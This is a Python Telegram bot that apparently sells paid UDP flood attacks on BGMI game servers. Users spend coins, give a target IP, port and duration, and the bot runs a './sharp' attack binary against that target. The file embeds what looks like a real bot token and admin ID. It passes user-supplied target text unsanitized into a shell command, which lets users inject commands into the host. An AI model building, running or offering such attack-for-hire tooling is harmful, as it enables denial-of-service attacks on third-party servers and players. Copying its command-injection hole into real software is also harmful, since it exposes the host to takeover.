# Necessary imports from your original script
import json
import subprocess
import requests
import datetime
import os
import threading
import time
import random
import string
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from flask import Flask
from threading import Thread
import telebot

# Telegram bot token
bot = telebot.TeleBot('7329014487:AAFWyiXtttJU-QXkfQ8CsWoHiJhpQ44oubo')

# Admin user IDs
admin_id = ["5163805719"]

# File path for coins
COINS_FILE = "user_coins.json"

# Data structure for coins
user_coins = {}

# Load coins from file
def load_user_coins():
    global user_coins
    try:
        with open(COINS_FILE, 'r') as file:
            user_coins = json.load(file)
    except FileNotFoundError:
        user_coins = {}

# Save coins to file
def save_user_coins():
    with open(COINS_FILE, 'w') as file:
        json.dump(user_coins, file)

# Manage coins
def add_coins(user_id, amount):
    user_id = str(user_id)
    user_coins[user_id] = user_coins.get(user_id, 0) + amount
    save_user_coins()

def deduct_coins(user_id, amount):
    user_id = str(user_id)
    if user_coins.get(user_id, 0) >= amount:
        user_coins[user_id] -= amount
        save_user_coins()
        return True
    return False

def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

# Authorization decorator
def check_authorization(func):
    def wrapper(message):
        user_id = str(message.chat.id)
        if user_id not in user_coins and user_id not in admin_id:
            bot.reply_to(message, "You are not authorized. Please contact admin.")
        else:
            func(message)
    return wrapper

# Load coins on startup
load_user_coins()

# Command handlers
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.chat.id)
    if user_id not in user_coins and user_id not in admin_id:
        bot.reply_to(message, "You are not authorized. Please contact admin.")
        return
    bot.reply_to(message, f"Welcome {user_name}! Use /bgmi to start an attack. Use /balance to check your coins.")

@bot.message_handler(commands=['bgmi'])
@check_authorization
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if deduct_coins(user_id, 10):  # Deduct 10 coins
        bot.reply_to(message, "Attack initiated successfully! 10 coins deducted.")
        # Add your UDP attack logic here
        bot.reply_to(message, "Enter the target IP address:")
        user_state[user_id] = {'step': 1}
    else:
        bot.reply_to(message, "Insufficient coins. Please earn or purchase more coins.")

@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_attack_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port:")
    elif state['step'] == 2:
        try:
            state['port'] = int(message.text)
            state['step'] = 3
            bot.reply_to(message, "Enter attack duration (in seconds):")
        except ValueError:
            bot.reply_to(message, "Invalid port. Please enter a numeric value:")
    elif state['step'] == 3:
        try:
            state['time'] = int(message.text)
            target = state['target']
            port = state['port']
            duration = state['time']

            # Simulating attack logic
            bot.reply_to(message, f"Starting attack on {target}:{port} for {duration} seconds...")
            full_command = f"./sharp {target} {port} {duration} 1000"
            subprocess.run(full_command, shell=True)
            bot.reply_to(message, f"Attack completed on {target}:{port} for {duration} seconds.")
            del user_state[user_id]  # Clear user state
        except ValueError:
            bot.reply_to(message, "Invalid duration. Please enter a numeric value.")

@bot.message_handler(commands=['balance'])
@check_authorization
def show_balance(message):
    user_id = str(message.chat.id)
    coins = get_user_coins(user_id)
    bot.reply_to(message, f"Your current balance: {coins} coins.")

@bot.message_handler(commands=['addcoins'])
def admin_add_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_id, amount = message.text.split()[1:3]
            amount = int(amount)
            add_coins(target_id, amount)
            bot.reply_to(message, f"{amount} coins added to user {target_id}.")
        except ValueError:
            bot.reply_to(message, "Invalid command. Use /addcoins <user_id> <amount>.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['rules'])
@check_authorization
def welcome_rules(message):
    response = '''Please follow these rules:
1. Do not start multiple attacks simultaneously.
2. Ensure you have enough coins before starting an attack.
3. Admins monitor activity regularly.'''
    bot.reply_to(message, response)

# Flask app to keep alive
app = Flask(__name__)
@app.route('/')
def index():
    return "Bot is running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# State tracking for user steps in BGMI
user_state = {}

# Start bot
if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)